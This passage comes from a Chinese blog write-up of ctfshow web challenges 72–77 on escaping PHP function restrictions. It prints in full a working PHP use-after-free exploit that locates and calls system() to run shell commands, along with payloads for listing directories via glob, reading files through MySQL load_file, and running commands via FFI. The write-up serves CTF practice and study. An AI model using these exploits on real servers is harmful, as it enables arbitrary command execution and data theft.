0%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20(%24i%20%2B%204)%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x786568326e6962)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20%24data_addr%20%2B%20%24i%20*%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_binary_base(%24binary_leak)%20%7B%0A%20%20%20%20%20%20%20%20%24base%20%3D%200%3B%0A%20%20%20%20%20%20%20%20%24start%20%3D%20%24binary_leak%20%26%200xfffffffffffff000%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%200x1000%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%3D%20%24start%20-%200x1000%20*%20%24i%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24addr%2C%200%2C%207)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20%3D%3D%200x10102464c457f)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20%24addr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_system(%24basic_funcs)%20%7B%0A%20%20%20%20%20%20%20%20%24addr%20%3D%20%24basic_funcs%3B%0A%20%20%20%20%20%20%20%20do%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_entry%20%3D%20leak(%24addr)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_name%20%3D%20leak(%24f_entry%2C%200%2C%206)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24f_name%20%3D%3D%200x6d6574737973)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20leak(%24addr%20%2B%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%2B%3D%200x20%3B%0A%20%20%20%20%20%20%20%20%7D%20while(%24f_entry%20!%3D%200)%3B%0A%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20trigger_uaf(%24arg)%20%7B%0A%0A%20%20%20%20%20%20%20%20%24arg%20%3D%20str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;)%3B%0A%20%20%20%20%20%20%20%20%24vuln%20%3D%20new%20Vuln()%3B%0A%20%20%20%20%20%20%20%20%24vuln-%3Ea%20%3D%20%24arg%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(stristr(PHP_OS%2C%20&#39;WIN&#39;))%20%7B%0A%20%20%20%20%20%20%20%20die(&#39;This%20PoC%20is%20for%20*nix%20systems%20only.&#39;)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24n_alloc%20%3D%2010%3B%20%0A%20%20%20%20%24contiguous%20%3D%20%5B%5D%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n_alloc%3B%20%24i%2B%2B)%0A%20%20%20%20%20%20%20%20%24contiguous%5B%5D%20%3D%20str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;)%3B%0A%0A%20%20%20%20trigger_uaf(&#39;x&#39;)%3B%0A%20%20%20%20%24abc%20%3D%20%24backtrace%5B1%5D%5B&#39;args&#39;%5D%5B0%5D%3B%0A%0A%20%20%20%20%24helper%20%3D%20new%20Helper%3B%0A%20%20%20%20%24helper-%3Eb%20%3D%20function%20(%24x)%20%7B%20%7D%3B%0A%0A%20%20%20%20if(strlen(%24abc)%20%3D%3D%2079%20%7C%7C%20strlen(%24abc)%20%3D%3D%200)%20%7B%0A%20%20%20%20%20%20%20%20die(%22UAF%20failed%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24closure_handlers%20%3D%20str2ptr(%24abc%2C%200)%3B%0A%20%20%20%20%24php_heap%20%3D%20str2ptr(%24abc%2C%200x58)%3B%0A%20%20%20%20%24abc_addr%20%3D%20%24php_heap%20-%200xc8%3B%0A%0A%20%20%20%20write(%24abc%2C%200x60%2C%202)%3B%0A%20%20%20%20write(%24abc%2C%200x70%2C%206)%3B%0A%0A%20%20%20%20write(%24abc%2C%200x10%2C%20%24abc_addr%20%2B%200x60)%3B%0A%20%20%20%20write(%24abc%2C%200x18%2C%200xa)%3B%0A%0A%20%20%20%20%24closure_obj%20%3D%20str2ptr(%24abc%2C%200x20)%3B%0A%0A%20%20%20%20%24binary_leak%20%3D%20leak(%24closure_handlers%2C%208)%3B%0A%20%20%20%20if(!(%24base%20%3D%20get_binary_base(%24binary_leak)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#39;t%20determine%20binary%20base%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24elf%20%3D%20parse_elf(%24base)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#39;t%20parse%20ELF%20header%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24basic_funcs%20%3D%20get_basic_funcs(%24base%2C%20%24elf)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#39;t%20get%20basic_functions%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24zif_system%20%3D%20get_system(%24basic_funcs)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#39;t%20get%20zif_system%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%0A%20%20%20%20%24fake_obj_offset%20%3D%200xd0%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%200x110%3B%20%24i%20%2B%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%20%24fake_obj_offset%20%2B%20%24i%2C%20leak(%24closure_obj%2C%20%24i))%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20write(%24abc%2C%200x20%2C%20%24abc_addr%20%2B%20%24fake_obj_offset)%3B%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x38%2C%201%2C%204)%3B%20%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x68%2C%20%24zif_system)%3B%20%0A%0A%20%20%20%20(%24helper-%3Eb)(%24cmd)%3B%0A%20%20%20%20exit()%3B%0A%7D%0A%0Actfshow(%22cat%20%2Fflag0.txt%22)%3Bob_end_flush()%3B%0A%3F%3E</code></pre>

<p>注意这个payload把方法当函数了，但是本质是一样的。</p>
<pre class="language-php" data-language="php"><code class="language-php">c&#x3D;function ctfshow($cmd) &#123;
    global $abc, $helper, $backtrace;

    class Vuln &#123;
        public $a;
        public function __destruct() &#123; 
            global $backtrace; 
            unset($this-&gt;a);
            $backtrace &#x3D; (new Exception)-&gt;getTrace();
            if(!isset($backtrace[1][&#39;args&#39;])) &#123;
                $backtrace &#x3D; debug_backtrace();
            &#125;
        &#125;
    &#125;

    class Helper &#123;
        public $a, $b, $c, $d;
    &#125;

    function str2ptr(&amp;$str, $p &#x3D; 0, $s &#x3D; 8) &#123;
        $address &#x3D; 0;
        for($j &#x3D; $s-1; $j &gt;&#x3D; 0; $j--) &#123;
            $address &lt;&lt;&#x3D; 8;
            $address |&#x3D; ord($str[$p+$j]);
        &#125;
        return $address;
    &#125;

    function ptr2str($ptr, $m &#x3D; 8) &#123;
        $out &#x3D; &quot;&quot;;
        for ($i&#x3D;0; $i &lt; $m; $i++) &#123;
            $out .&#x3D; sprintf(&quot;%c&quot;,($ptr &amp; 0xff));
            $ptr &gt;&gt;&#x3D; 8;
        &#125;
        return $out;
    &#125;

    function write(&amp;$str, $p, $v, $n &#x3D; 8) &#123;
        $i &#x3D; 0;
        for($i &#x3D; 0; $i &lt; $n; $i++) &#123;
            $str[$p + $i] &#x3D; sprintf(&quot;%c&quot;,($v &amp; 0xff));
            $v &gt;&gt;&#x3D; 8;
        &#125;
    &#125;

    function leak($addr, $p &#x3D; 0, $s &#x3D; 8) &#123;
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak &#x3D; strlen($helper-&gt;a);
        if($s !&#x3D; 8) &#123; $leak %&#x3D; 2 &lt;&lt; ($s * 8) - 1; &#125;
        return $leak;
    &#125;

    function parse_elf($base) &#123;
        $e_type &#x3D; leak($base, 0x10, 2);

        $e_phoff &#x3D; leak($base, 0x20);
        $e_phentsize &#x3D; leak($base, 0x36, 2);
        $e_phnum &#x3D; leak($base, 0x38, 2);

        for($i &#x3D; 0; $i &lt; $e_phnum; $i++) &#123;
            $header &#x3D; $base + $e_phoff + $i * $e_phentsize;
            $p_type  &#x3D; leak($header, 0, 4);
            $p_flags &#x3D; leak($header, 4, 4);
            $p_vaddr &#x3D; leak($header, 0x10);
            $p_memsz &#x3D; leak($header, 0x28);

            if($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 6) &#123; 

                $data_addr &#x3D; $e_type &#x3D;&#x3D; 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size &#x3D; $p_memsz;
            &#125; else if($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 5) &#123; 
                $text_size &#x3D; $p_memsz;
            &#125;
        &#125;

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    &#125;

    function get_basic_funcs($base, $elf) &#123;
        list($data_addr, $text_size, $data_size) &#x3D; $elf;
        for($i &#x3D; 0; $i &lt; $data_size &#x2F; 8; $i++) &#123;
            $leak &#x3D; leak($data_addr, $i * 8);
            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;
                $deref &#x3D; leak($leak);
                
                if($deref !&#x3D; 0x746e6174736e6f63)
                    continue;
            &#125; else continue;

            $leak &#x3D; leak($data_addr, ($i + 4) * 8);
            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;
                $deref &#x3D; leak($leak);
                
                if($deref !&#x3D; 0x786568326e6962)
                    continue;
            &#125; else continue;

            return $data_addr + $i * 8;
        &#125;
    &#125;

    function get_binary_base($binary_leak) &#123;
        $base &#x3D; 0;
        $start &#x3D; $binary_leak &amp; 0xfffffffffffff000;
        for($i &#x3D; 0; $i &lt; 0x1000; $i++) &#123;
            $addr &#x3D; $start - 0x1000 * $i;
            $leak &#x3D; leak($addr, 0, 7);
            if($leak &#x3D;&#x3D; 0x10102464c457f) &#123;
                return $addr;
            &#125;
        &#125;
    &#125;

    function get_system($basic_funcs) &#123;
        $addr &#x3D; $basic_funcs;
        do &#123;
            $f_entry &#x3D; leak($addr);
            $f_name &#x3D; leak($f_entry, 0, 6);

            if($f_name &#x3D;&#x3D; 0x6d6574737973) &#123;
                return leak($addr + 8);
            &#125;
            $addr +&#x3D; 0x20;
        &#125; while($f_entry !&#x3D; 0);
        return false;
    &#125;

    function trigger_uaf($arg) &#123;

        $arg &#x3D; str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);
        $vuln &#x3D; new Vuln();
        $vuln-&gt;a &#x3D; $arg;
    &#125;

    if(stristr(PHP_OS, &#39;WIN&#39;)) &#123;
        die(&#39;This PoC is for *nix systems only.&#39;);
    &#125;

    $n_alloc &#x3D; 10; 
    $contiguous &#x3D; [];
    for($i &#x3D; 0; $i &lt; $n_alloc; $i++)
        $contiguous[] &#x3D; str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);

    trigger_uaf(&#39;x&#39;);
    $abc &#x3D; $backtrace[1][&#39;args&#39;][0];

    $helper &#x3D; new Helper;
    $helper-&gt;b &#x3D; function ($x) &#123; &#125;;

    if(strlen($abc) &#x3D;&#x3D; 79 || strlen($abc) &#x3D;&#x3D; 0) &#123;
        die(&quot;UAF failed&quot;);
    &#125;

    $closure_handlers &#x3D; str2ptr($abc, 0);
    $php_heap &#x3D; str2ptr($abc, 0x58);
    $abc_addr &#x3D; $php_heap - 0xc8;

    write($abc, 0x60, 2);
    write($abc, 0x70, 6);

    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);

    $closure_obj &#x3D; str2ptr($abc, 0x20);

    $binary_leak &#x3D; leak($closure_handlers, 8);
    if(!($base &#x3D; get_binary_base($binary_leak))) &#123;
        die(&quot;Couldn&#39;t determine binary base address&quot;);
    &#125;

    if(!($elf &#x3D; parse_elf($base))) &#123;
        die(&quot;Couldn&#39;t parse ELF header&quot;);
    &#125;

    if(!($basic_funcs &#x3D; get_basic_funcs($base, $elf))) &#123;
        die(&quot;Couldn&#39;t get basic_functions address&quot;);
    &#125;

    if(!($zif_system &#x3D; get_system($basic_funcs))) &#123;
        die(&quot;Couldn&#39;t get zif_system address&quot;);
    &#125;


    $fake_obj_offset &#x3D; 0xd0;
    for($i &#x3D; 0; $i &lt; 0x110; $i +&#x3D; 8) &#123;
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    &#125;

    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); 
    write($abc, 0xd0 + 0x68, $zif_system); 

    ($helper-&gt;b)($cmd);
    exit();
&#125;

ctfshow(&quot;cat &#x2F;flag0.txt&quot;);ob_end_flush();
?&gt;</code></pre>

<h2 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h2><p>UseAfterFree disable function</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_62414126/article/details/124062044">https://blog.csdn.net/qq_62414126&#x2F;article&#x2F;details&#x2F;124062044</a></p>
</blockquote>
<h2 id="为什么在使用eval-函数有时候需要添加"><a href="#为什么在使用eval-函数有时候需要添加" class="headerlink" title="为什么在使用eval()函数有时候需要添加?&gt;"></a>为什么在使用eval()函数有时候需要添加?&gt;</h2><pre class="language-none"><code class="language-none">&lt;?php eval($_GET[1]); #如果我们通过&lt;?&#x3D;&#96;ls&#96;;去执行的话需要在前面添加?&gt; 
</code></pre>

<p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680271079308-e8ea37f7-98ed-4c6d-bb24-97c1fc8eae1e.png" alt="image.png"><br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680271079316-0676564d-ce6c-485f-b4a4-0e97d778430d.png" alt="image.png"><br>原因是eval()函数相当于执行php的代码，而<?= 就相当于<?php echo
在PHP7以上不管short_open_tag配置是不是开启的。都可以使用。
所以就相当于一个新的PHP文件，这样的话就需要将最开始前面的<?php给闭合，不然不会执行。
闭合之后就相当于
<?php ?> &lt;?&#x3D;<code>ls</code>;</p>
<h1 id="web73"><a href="#web73" class="headerlink" title="web73"></a>web73</h1><p>先查看一下文件列表：</p>
<pre class="language-php" data-language="php"><code class="language-php">c&#x3D;?&gt;&lt;?php $a&#x3D;new DirectoryIterator(&quot;glob:&#x2F;&#x2F;&#x2F;*&quot;);
foreach($a as $f)
&#123;echo($f-&gt;__toString().&#39; &#39;);
&#125;
exit(0);
?&gt;</code></pre>

<p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681223723167-df56bcb3-9699-4868-b367-3d8a06f49f82.png" alt="image.png"><br>flag文件在flagc.txt里面。<br>实际上，这道题可以直接使用include来读取：</p>
<pre class="language-php" data-language="php"><code class="language-php">c&#x3D;include(&#39;&#x2F;flagc.txt&#39;);exit(0);</code></pre>

<p>但是看了b站的视频发现是想要用上一道题的payload，但是交了之后发现提示说strlen函数被禁用了：<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681223844662-48c977ec-a595-46e3-b89b-ecf337552378.png" alt="image.png"><br>然后他的想法是将禁用的strlen函数给重写。<br>那么直接简单重写即可：</p>
<pre class="language-php" data-language="php"><code class="language-php">&#x2F;&#x2F;strlen 返回字符串长度
function length($a)&#123;
    $length &#x3D; 0;
    for($i &#x3D; 0; $i &lt; 10000; $i++)&#123;
        if ($a[$i])&#123;
            $length +&#x3D; 1;
        &#125;else&#123;
            break;
        &#125;
    &#125;
    return $length;
&#125;</code></pre>

<p>然后修改上一道题的payload：</p>
<pre class="language-php" data-language="php"><code class="language-php">function ctfshow($cmd) &#123;
    global $abc, $helper, $backtrace;

    class Vuln &#123;
        public $a;
        public function __destruct() &#123; 
            global $backtrace; 
            unset($this-&gt;a);
            $backtrace &#x3D; (new Exception)-&gt;getTrace();
            if(!isset($backtrace[1][&#39;args&#39;])) &#123;
                $backtrace &#x3D; debug_backtrace();
            &#125;
        &#125;
    &#125;

    class Helper &#123;
        public $a, $b, $c, $d;
    &#125;

    function str2ptr(&amp;$str, $p &#x3D; 0, $s &#x3D; 8) &#123;
        $address &#x3D; 0;
        for($j &#x3D; $s-1; $j &gt;&#x3D; 0; $j--) &#123;
            $address &lt;&lt;&#x3D; 8;
            $address |&#x3D; ord($str[$p+$j]);
        &#125;
        return $address;
    &#125;

    function ptr2str($ptr, $m &#x3D; 8) &#123;
        $out &#x3D; &quot;&quot;;
        for ($i&#x3D;0; $i &lt; $m; $i++) &#123;
            $out .&#x3D; sprintf(&quot;%c&quot;,($ptr &amp; 0xff));
            $ptr &gt;&gt;&#x3D; 8;
        &#125;
        return $out;
    &#125;

    function write(&amp;$str, $p, $v, $n &#x3D; 8) &#123;
        $i &#x3D; 0;
        for($i &#x3D; 0; $i &lt; $n; $i++) &#123;
            $str[$p + $i] &#x3D; sprintf(&quot;%c&quot;,($v &amp; 0xff));
            $v &gt;&gt;&#x3D; 8;
        &#125;
    &#125;
    function length($a)&#123;
    $length &#x3D; 0;
    for($i &#x3D; 0; $i &lt; 10000; $i++)&#123;
        if ($a[$i])&#123;
            $length +&#x3D; 1;
        &#125;else&#123;
            break;
        &#125;
    &#125;
    return $length;
&#125;

    function leak($addr, $p &#x3D; 0, $s &#x3D; 8) &#123;
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak &#x3D; length($helper-&gt;a);
        if($s !&#x3D; 8) &#123; $leak %&#x3D; 2 &lt;&lt; ($s * 8) - 1; &#125;
        return $leak;
    &#125;

    function parse_elf($base) &#123;
        $e_type &#x3D; leak($base, 0x10, 2);

        $e_phoff &#x3D; leak($base, 0x20);
        $e_phentsize &#x3D; leak($base, 0x36, 2);
        $e_phnum &#x3D; leak($base, 0x38, 2);

        for($i &#x3D; 0; $i &lt; $e_phnum; $i++) &#123;
            $header &#x3D; $base + $e_phoff + $i * $e_phentsize;
            $p_type  &#x3D; leak($header, 0, 4);
            $p_flags &#x3D; leak($header, 4, 4);
            $p_vaddr &#x3D; leak($header, 0x10);
            $p_memsz &#x3D; leak($header, 0x28);

            if($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 6) &#123; 

                $data_addr &#x3D; $e_type &#x3D;&#x3D; 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size &#x3D; $p_memsz;
            &#125; else if($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 5) &#123; 
                $text_size &#x3D; $p_memsz;
            &#125;
        &#125;

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    &#125;

    function get_basic_funcs($base, $elf) &#123;
        list($data_addr, $text_size, $data_size) &#x3D; $elf;
        for($i &#x3D; 0; $i &lt; $data_size &#x2F; 8; $i++) &#123;
            $leak &#x3D; leak($data_addr, $i * 8);
            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;
                $deref &#x3D; leak($leak);
                
                if($deref !&#x3D; 0x746e6174736e6f63)
                    continue;
            &#125; else continue;

            $leak &#x3D; leak($data_addr, ($i + 4) * 8);
            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;
                $deref &#x3D; leak($leak);
                
                if($deref !&#x3D; 0x786568326e6962)
                    continue;
            &#125; else continue;

            return $data_addr + $i * 8;
        &#125;
    &#125;

    function get_binary_base($binary_leak) &#123;
        $base &#x3D; 0;
        $start &#x3D; $binary_leak &amp; 0xfffffffffffff000;
        for($i &#x3D; 0; $i &lt; 0x1000; $i++) &#123;
            $addr &#x3D; $start - 0x1000 * $i;
            $leak &#x3D; leak($addr, 0, 7);
            if($leak &#x3D;&#x3D; 0x10102464c457f) &#123;
                return $addr;
            &#125;
        &#125;
    &#125;

    function get_system($basic_funcs) &#123;
        $addr &#x3D; $basic_funcs;
        do &#123;
            $f_entry &#x3D; leak($addr);
            $f_name &#x3D; leak($f_entry, 0, 6);

            if($f_name &#x3D;&#x3D; 0x6d6574737973) &#123;
                return leak($addr + 8);
            &#125;
            $addr +&#x3D; 0x20;
        &#125; while($f_entry !&#x3D; 0);
        return false;
    &#125;

    function trigger_uaf($arg) &#123;

        $arg &#x3D; str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);
        $vuln &#x3D; new Vuln();
        $vuln-&gt;a &#x3D; $arg;
    &#125;

    if(stristr(PHP_OS, &#39;WIN&#39;)) &#123;
        die(&#39;This PoC is for *nix systems only.&#39;);
    &#125;

    $n_alloc &#x3D; 10; 
    $contiguous &#x3D; [];
    for($i &#x3D; 0; $i &lt; $n_alloc; $i++)
        $contiguous[] &#x3D; str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);

    trigger_uaf(&#39;x&#39;);
    $abc &#x3D; $backtrace[1][&#39;args&#39;][0];

    $helper &#x3D; new Helper;
    $helper-&gt;b &#x3D; function ($x) &#123; &#125;;

    if(length($abc) &#x3D;&#x3D; 79 || length($abc) &#x3D;&#x3D; 0) &#123;
        die(&quot;UAF failed&quot;);
    &#125;

    $closure_handlers &#x3D; str2ptr($abc, 0);
    $php_heap &#x3D; str2ptr($abc, 0x58);
    $abc_addr &#x3D; $php_heap - 0xc8;

    write($abc, 0x60, 2);
    write($abc, 0x70, 6);

    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);

    $closure_obj &#x3D; str2ptr($abc, 0x20);

    $binary_leak &#x3D; leak($closure_handlers, 8);
    if(!($base &#x3D; get_binary_base($binary_leak))) &#123;
        die(&quot;Couldn&#39;t determine binary base address&quot;);
    &#125;

    if(!($elf &#x3D; parse_elf($base))) &#123;
        die(&quot;Couldn&#39;t parse ELF header&quot;);
    &#125;

    if(!($basic_funcs &#x3D; get_basic_funcs($base, $elf))) &#123;
        die(&quot;Couldn&#39;t get basic_functions address&quot;);
    &#125;

    if(!($zif_system &#x3D; get_system($basic_funcs))) &#123;
        die(&quot;Couldn&#39;t get zif_system address&quot;);
    &#125;


    $fake_obj_offset &#x3D; 0xd0;
    for($i &#x3D; 0; $i &lt; 0x110; $i +&#x3D; 8) &#123;
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    &#125;

    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); 
    write($abc, 0xd0 + 0x68, $zif_system); 

    ($helper-&gt;b)($cmd);
    exit();
&#125;

ctfshow(&quot;cat &#x2F;flagc.txt&quot;);ob_end_flush();
?&gt;</code></pre>

<p>但是访问之后会502，看了视频发现也是502</p>
<h1 id="web74"><a href="#web74" class="headerlink" title="web74"></a>web74</h1><p>先扫目录文件</p>
<pre class="language-php" data-language="php"><code class="language-php">c&#x3D;?&gt;&lt;?php $a&#x3D;new DirectoryIterator(&quot;glob:&#x2F;&#x2F;&#x2F;*&quot;);
foreach($a as $f)
&#123;echo($f-&gt;__toString().&#39; &#39;);
&#125;
exit(0);
?&gt;</code></pre>

<p>文件被修改为flagx.txt，直接像上一道题一样include文件包含就行。</p>
<h1 id="web75"><a href="#web75" class="headerlink" title="web75"></a>web75</h1><p>先看文件目录：</p>
<pre class="language-php" data-language="php"><code class="language-php">c&#x3D;$a&#x3D;new DirectoryIterator(&quot;glob:&#x2F;&#x2F;&#x2F;*&quot;);
foreach($a as $f)&#123;
	echo($f-&gt;__toString().&#39; &#39;);
&#125;exit();</code></pre>

<p>抽象，看了视频说直接使用数据库。</p>
<pre class="language-php" data-language="php"><code class="language-php">c&#x3D;try &#123;$dbh &#x3D; new PDO(&#39;mysql:host&#x3D;localhost;dbname&#x3D;ctftraining&#39;, &#39;root&#39;,
&#39;root&#39;);foreach($dbh-&gt;query(&#39;select load_file(&quot;&#x2F;flag36.txt&quot;)&#39;) as $row)
&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh &#x3D; null;&#125;catch (PDOException $e) &#123;echo $e-
&gt;getMessage();exit(0);&#125;exit(0);</code></pre>

<p>但是他并没有提这个数据库名称是怎么来的。<br>我们可以通过通用的数据库来获取到数据库的名称：</p>
<pre class="language-php" data-language="php"><code class="language-php">$dsn &#x3D; &quot;mysql:host&#x3D;localhost;dbname&#x3D;information_schema&quot;;
$db &#x3D; new PDO($dsn, &#39;root&#39;, &#39;root&#39;);
$rs &#x3D; $db-&gt;query(&quot;select group_concat(SCHEMA_NAME) from SCHEMATA&quot;);
foreach($rs as $row)&#123;
        echo($row[0]).&quot;|&quot;; 
&#125;exit();</code></pre>

<p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681290428024-3c729f7a-edc5-4787-a8df-5f0a30f7a678.png" alt="image.png"><br>然后在使用他提供的payload就可以了。</p>
<h1 id="web76"><a href="#web76" class="headerlink" title="web76"></a>web76</h1><p>文件名修改为了flag36d.txt<br>直接用上一道题的payload获取flag即可。</p>
<h1 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h1><blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44700621/article/details/125381763">https://blog.csdn.net/weixin_44700621&#x2F;article&#x2F;details&#x2F;125381763</a> 这个写的挺全的</p>
</blockquote>
<p>还是先看文件名，发现有两个可疑文件：flag36x.tx t和 readflag<br>题里面提示了是php7.4。payload使用的是PHP 7.4+的FFI特性，即外部函数接口特性</p>
<pre class="language-php" data-language="php"><code class="language-php">$ffi &#x3D; FFI::cdef(&quot;int system(const char *command);&quot;);&#x2F;&#x2F;创建一个system对象
$a&#x3D;&#39;&#x2F;readflag &gt; 1.txt&#39;;&#x2F;&#x2F;没有回显的
$ffi-&gt;system($a);&#x2F;&#x2F;通过$ffi去调用system函数</code></pre>

<p>由于没有回显，所以这里要把结果写到1.txt里面。<br>PHP手册中对<code>FFI:cdef</code>原型的描述为<code>public static FFI::cdef(string $code = &quot;&quot;, ?string $lib = null)</code>，其中$code为一个字符串，包含常规C语言中的一系列声明，$lib为要加载和链接的共享库文件名称，如果省略lib，则平台将会尝试在全局范围内查找代码中声明的符号，其他系统将无法解析这些符号。<br><code>int system(const char *command);</code>即为C语言中system函数的定义，用于执行系统命令，也即在Linux平台下将&#x2F;readflag &gt; 1.txt使用shell进行解析并执行，因此猜测readflag可能是一个可执行文件。<br>因此也可以用这种方法读取根目录下的文件：</p>
<pre class="language-php" data-language="php"><code class="language-php">c&#x3D;$ffi &#x3D; FFI::cdef(&quot;int system(const char *command);&quot;);
$a&#x3D;&#39;ls &#x2F; &gt; 1.txt&#39;;
$ffi-&gt;system($a);exit();</code></pre>

<p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681291412242-bd33651d-8eaf-4013-bf26-6ab8ad987bfd.png" alt="image.png"><br>最后的获取flag的payload如下：</p>
<pre class="language-php" data-language="php"><code class="language-php">c&#x3D;$ffi &#x3D; FFI::cdef(&quot;int system(const char *command);&quot;);
$a&#x3D;&#39;&#x2F;readflag &gt; 1.txt&#39;;
$ffi-&gt;system($a);exit();</code></pre>

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>后面几道题做起来真是抽象中的抽象，但是也给了我很多视角，感觉挺耳目一新的就是那个73里面对uaf的方法重写的想法挺新奇的，之前没有想过。</p>

                            
                        </article>
                    </div>


                    <div class="fleet-content-body-footer mt-16">
                        <!--翻页器-->
                        <div class="flex-row flex w-full justify-between">
